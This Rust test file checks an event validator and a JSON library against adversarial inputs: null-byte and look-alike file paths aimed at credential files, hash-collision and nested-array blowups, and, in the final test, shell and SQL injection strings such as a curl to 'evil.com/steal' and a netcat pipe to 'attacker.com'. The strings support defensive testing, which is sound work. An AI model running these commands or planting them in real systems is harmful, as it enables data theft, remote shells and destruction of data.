use crate::common::prelude::*;
use sinex_db::validation::EventValidator;

#[sinex_test]
async fn test_unicode_path_normalization_bypass(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();

    // Same path in different Unicode normalizations
    let paths = vec![
        "café.txt",  // NFC (composed)
        "café.txt",  // NFD (decomposed) - looks same but different bytes
        "ﬁle.txt",   // Ligature fi
        "file.txt",  // Regular fi
        "../паѕѕwd", // Cyrillic 'a' and 's' that look like Latin
        "../passwd", // Latin characters
    ];

    for path in &paths {
        let event = json!({
            "path": path,
            "size": 1024
        });

        let result = validator.validate_with_rules("fs", "file.created", &event);
        println!(
            "Path '{}' validation: {:?} (bytes: {:?})",
            path,
            result.is_ok(),
            path.as_bytes()
        );
    }

    // These might bypass security checks due to normalization
    Ok(())
}

#[sinex_test]
async fn test_null_byte_injection_paths(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();

    // Paths with null bytes - these should be rejected but might not be
    let malicious_paths = vec![
        "/etc/passwd\0.txt",
        "/tmp/\0/../../etc/shadow",
        "file\0\0.txt",
        "\0/etc/passwd",
        "/home/user/.ssh/id_rsa\0.backup",
    ];

    for path in malicious_paths {
        let event = json!({
            "path": path,
            "size": 1024
        });

        match validator.validate_with_rules("fs", "file.created", &event) {
            Ok(_) => println!("VULNERABILITY: Null byte path accepted: {:?}", path),
            Err(e) => println!("Null byte path rejected (good): {:?} - {}", path, e),
        }
    }
    Ok(())
}

#[sinex_test]
async fn test_json_hash_collision_dos(ctx: TestContext) -> TestResult {
    // Create JSON object with keys that hash to same bucket
    // This is implementation-specific but common pattern
    let mut collision_object = HashMap::new();

    // These strings often collide in simple hash functions
    let collision_keys = vec![
        "Aa", "BB", // Often same hash
        "AaAa", "AaBB", "BBAa", "BBBB", // Chain collisions
    ];

    for i in 0..10000 {
        let key = format!("{}{}", collision_keys[i % collision_keys.len()], i);
        collision_object.insert(key, i);
    }

    let start = std::time::Instant::now();
    let json_value = json!(collision_object);
    let _serialized = serde_json::to_string(&json_value);
    let elapsed = start.elapsed();

    println!(
        "Serialization of collision-prone object took: {:?}",
        elapsed
    );

    if elapsed.as_secs() > 1 {
        println!("VULNERABILITY: Hash collision DoS possible!");
    }
    Ok(())
}

#[sinex_test]
async fn test_json_exponential_entity_expansion(ctx: TestContext) -> TestResult {
    // Billion laughs attack variant for JSON
    let mut expanding_json = json!({
        "a1": vec!["x"; 10],
    });

    // Each level references the previous 10 times
    for i in 2..=10 {
        let prev_key = format!("a{}", i - 1);
        let new_key = format!("a{}", i);

        // In real attack, this would use references
        // Here we simulate the expansion
        if let Some(prev_val) = expanding_json.get(&prev_key) {
            let mut new_array = vec![];
            for _ in 0..10 {
                new_array.push(prev_val.clone());
            }
            expanding_json[new_key] = json!(new_array);
        }
    }

    // Calculate theoretical size
    let depth = 10;
    let expansion_factor: u32 = 10;
    let theoretical_size = expansion_factor.pow(depth as u32);

    println!("Theoretical expansion size: {} elements", theoretical_size);
    println!(
        "Actual JSON size: {} bytes",
        serde_json::to_string(&expanding_json)
            .unwrap_or_default()
            .len()
    );
    Ok(())
}

#[sinex_test]
async fn test_path_case_confusion_attacks(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();

    // Test case variations that might bypass filters
    let case_variants = vec![
        ("/etc/PASSWD", "/etc/passwd"),
        ("/Etc/pAsSwD", "/etc/passwd"),
        ("/ETC/PASSWD", "/etc/passwd"),
        ("/home/USER/.ssh", "/home/user/.ssh"),
        ("C:\\Windows\\System32", "c:\\windows\\system32"),
    ];

    for (variant, canonical) in case_variants {
        let event = json!({
            "path": variant,
            "size": 1024
        });

        let result = validator.validate_with_rules("fs", "file.created", &event);
        println!(
            "Path '{}' (canonical: '{}'): {:?}",
            variant,
            canonical,
            result.is_ok()
        );
    }
    Ok(())
}

#[sinex_test]
async fn test_json_parser_differential(ctx: TestContext) -> TestResult {
    // Different JSON parsers handle edge cases differently
    let tricky_json_strings = vec![
        r#"{"key": 1.0000000000000000000000000000000001}"#, // Precision loss
        r#"{"key": 9007199254740993}"#,                     // Beyond JS safe integer
        r#"{"key": "\uD800"}"#,                             // Unpaired surrogate
        r#"{"key": "\u0000"}"#,                             // Null character
        r#"{"a": 1, "a": 2}"#,                              // Duplicate keys
        r#"{"key": -0}"#,                                   // Negative zero
        r#"{"key": Infinity}"#,                             // Invalid JSON but some parsers accept
    ];

    for json_str in tricky_json_strings {
        match serde_json::from_str::<serde_json::Value>(json_str) {
            Ok(val) => println!("Parsed OK: {} -> {:?}", json_str, val),
            Err(e) => println!("Parse error: {} -> {}", json_str, e),
        }
    }
    Ok(())
}

#[sinex_test]
async fn test_hash_collision_dos_attack(ctx: TestContext) -> TestResult {
    // Create JSON object with keys that hash to same bucket using djb2 collision strings
    let mut collision_object = HashMap::new();

    // Known djb2 hash collision strings (hash to same value)
    let djb2_collisions = vec![
        ("hetairas", "mentioner"),
        ("heliotropes", "neurospora"),
        ("depravement", "serafins"),
        ("stylist", "subgenera"),
        ("joyful", "synaphea"),
        ("redescribed", "urites"),
    ];

    // Build large object with colliding keys
    for i in 0..1000 {
        for (key1, key2) in &djb2_collisions {
            collision_object.insert(format!("{}_{}", key1, i), format!("value1_{}", i));
            collision_object.insert(format!("{}_{}", key2, i), format!("value2_{}", i));
        }
    }

    let start = std::time::Instant::now();
    let json_value = json!(collision_object);
    let _serialized = serde_json::to_string(&json_value);
    let elapsed = start.elapsed();

    println!("Hash collision DoS test:");
    println!("- Object size: {} keys", collision_object.len());
    println!("- Serialization time: {:?}", elapsed);

    if elapsed.as_millis() > 100 {
        println!("POTENTIAL VULNERABILITY: Hash collision causing performance degradation!");
    }

    // Also test deserialization performance
    let serialized = serde_json::to_string(&json_value).unwrap();
    let start = std::time::Instant::now();
    let _: serde_json::Value = serde_json::from_str(&serialized).unwrap();
    let deser_elapsed = start.elapsed();

    println!("- Deserialization time: {:?}", deser_elapsed);
    if deser_elapsed.as_millis() > 100 {
        println!("POTENTIAL VULNERABILITY: Hash collision affecting deserialization!");
    }
    Ok(())
}

#[sinex_test]
async fn test_json_nested_array_explosion(ctx: TestContext) -> TestResult {
    // Test exponentially expanding nested arrays that can cause memory exhaustion
    let mut nested_array = json!([1, 2, 3]);

    // Each iteration doubles the size by nesting the array inside itself
    for level in 1..=12 {
        // Limit to prevent actual OOM in test
        nested_array = json!([nested_array.clone(), nested_array.clone()]);

        let serialized =
            serde_json::to_string(&nested_array).unwrap_or_else(|_| "FAILED".to_string());
        println!(
            "Level {}: Array serialized size: {} bytes",
            level,
            serialized.len()
        );

        // Stop if size gets too large (theoretical explosion would be much larger)
        if serialized.len() > 1_000_000 {
            println!(
                "STOPPING: Array explosion reaching memory limits at level {}",
                level
            );
            break;
        }
    }

    // Test with string content explosion
    let base_string = "x".repeat(100);
    let mut exploding_strings = json!([base_string]);

    for level in 1..=8 {
        exploding_strings = json!([exploding_strings.clone(), exploding_strings.clone()]);

        if let Ok(serialized) = serde_json::to_string(&exploding_strings) {
            println!(
                "String explosion level {}: {} bytes",
                level,
                serialized.len()
            );
            if serialized.len() > 10_000_000 {
                println!("STOPPING: String explosion at level {}", level);
                break;
            }
        } else {
            println!("Serialization failed at level {}", level);
            break;
        }
    }
    Ok(())
}

#[sinex_test]
async fn test_filesystem_race_condition_attacks(ctx: TestContext) -> TestResult {
    // Simulated TOCTOU (Time-of-check to time-of-use) scenarios
    let suspicious_patterns = vec![
        // Quick file replacement
        ("check_file.txt", "replace_with_symlink"),
        // Directory traversal via symlink
        ("safe_dir/file.txt", "symlink_to_/etc/passwd"),
        // Race between stat and open
        ("normal_file.txt", "swap_during_processing"),
    ];

    for (initial, attack) in suspicious_patterns {
        println!("TOCTOU scenario: {} -> {}", initial, attack);
        // In real test, would create files and race operations
    }
    Ok(())
}

#[sinex_test]
async fn test_command_injection_via_json(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();

    // Commands that might be interpreted if not properly escaped
    let injection_attempts = vec![
        r#"ls; cat /etc/passwd"#,
        r#"ls && curl evil.com/steal"#,
        r#"`cat /etc/passwd`"#,
        r#"$(cat /etc/passwd)"#,
        r#"'; DROP TABLE events; --"#,
        r#"../../../bin/sh"#,
        r#"|nc attacker.com 4444"#,
    ];

    for cmd in injection_attempts {
        let event = json!({
            "command": cmd,
            "working_directory": "/tmp"
        });

        // This should validate the structure but not execute
        let result = validator.validate_with_rules("terminal", "command.executed", &event);
        println!("Command injection attempt '{}': {:?}", cmd, result.is_ok());
    }
    Ok(())
}
